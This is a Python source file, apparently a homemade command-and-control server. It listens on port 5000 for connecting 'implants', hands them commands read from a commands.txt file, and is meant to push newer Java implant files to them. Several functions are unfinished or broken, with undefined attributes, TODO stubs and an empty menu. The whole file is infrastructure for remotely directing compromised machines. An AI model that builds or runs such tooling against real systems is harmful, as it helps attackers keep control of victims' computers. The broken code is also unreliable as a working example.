import socket
import os
import threading


class C2Server:
    def __init__(self):
        # self.find_current_implant()
        self.port = 5000
        self.host = "0.0.0.0"
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        print("Listening for conns")
        self.sock.listen(10)
        while True:
            clientConn, addr = self.sock.accept()
            print("Accepted client from:", addr)
            clientConn.settimeout(69)
            threading.Thread(target=ClientHandler, args=(clientConn, addr)).start()

    def printMenu(self):
        print("menu")

    def run(self):
        threading.Thread(target=self.listen).start()
        while True:
            self.printMenu()
            selection = input("Select option")

    def find_current_implant(self):
        implants = {}
        for file in os.listdir("./Implants"):
            if file.endswith(".java"):
                implant_path = os.path.join("./Implants", file)
                creation_time = int(os.path.getctime(implant_path))
                implants[creation_time] = implant_path
        cur_implant = None
        for key in implants.keys():
            if cur_implant == None:
                cur_implant = key
            if cur_implant < key:
                cur_implant = key
        with open("current_hash.txt", "w") as f:
            self.cur_hash = cur_implant
            self.cur_hash_path = implants[cur_implant]
            f.write(str(cur_implant))

    def json_resc(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(bufferSz).decode("utf-8")
                return json_data
            except ValueError:
                continue

    def send_file(self):
        f = open(self.cur_hash_path, "rb")
        line = f.read(1024)
        print("Starting file transfer...")
        while line:
            self.conn.send(line)
            line = f.read(1024)
        f.close()
        print("File transfered")


class ClientHandler:
    def __init__(self, clientConn: socket, addr) -> None:
        print("starting handler")
        self.clientConn = clientConn
        self.addr = addr
        self.MSGSIZE = 4096
        self.main()

    def sendMsg(self, message: str):
        sendMsg = message.encode()
        self.clientConn.send(sendMsg)

    def recvMsg(self):
        receivedMessage = self.clientConn.recv(self.MSGSIZE).decode("utf-8")
        return receivedMessage

    def doAction(self, command: str, arguments: list[str]):
        if command == "hash":
            if arguments[0] == "this":  # TODO make this the hash
                print("Implant is unchanged...")
                self.sendMsg("No new implant found...")
            else:
                print("New Implant Detected.. Sending new implant")
                self.sendMsg("TODO: send new implant")
                # hash_string = "New Hash: " + str(self.cur_hash)
                # self.conn.send(hash_string.encode())
                # self.send_file()
        elif command == "info":
            pass
        elif command == "ready":
            with open("commands.txt", "r") as f:
                for line in f.readlines():
                    self.sendMsg(line)
        elif command == "echo":
            print("Echoing message")
            self.sendMsg(" ".join(arguments))
        elif command == "what":
            self.sendMsg("sc")

    def main(self):
        while True:
            try:
                data = self.recvMsg()
                if data:
                    command, *args = data.split()
                    self.doAction(command, args)
            except Exception as e:
                print(e)
                print("closing connection forcibly, exception")
                self.clientConn.close()


def main():
    c2 = C2Server()
    c2.run()


if __name__ == "__main__":
    main()
